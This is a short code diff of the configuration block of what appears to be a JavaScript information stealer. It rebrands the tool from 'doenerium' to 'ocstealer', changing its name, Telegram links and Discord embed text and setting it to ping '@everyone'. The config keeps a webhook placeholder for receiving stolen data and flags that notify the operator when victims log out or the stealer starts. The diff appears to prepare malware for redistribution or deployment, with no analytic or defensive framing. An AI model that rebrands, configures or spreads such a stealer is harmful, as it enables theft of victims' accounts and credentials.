@@ -11,7 +11,7 @@ const fs = require("fs");
 // Initialization
 
 var config = {
-    brand: "doenerium",
+    brand: "ocstealer",
 
     webhook: "REPLACE_ME",
 
@@ -20,15 +20,15 @@ var config = {
 
     notify_on_logout: true,
     notify_on_initialization: true,
-    ping: [true, "@doener"],
+    ping: [true, "@everyone"],
 
     embed: {
-        username: "doenerium | t.me/doenerium",
+        username: "ocstealer | t.me/ocstealer",
         footer: {
-            text: `doenerium | t.me/doenerium`,
+            text: `ocstealer | t.me/ocstealer`,
             icon_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
         },
-        href: "https://t.me/doenerium",
+        href: "https://t.me/ocstealer",
         avatar_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless"
     },
 
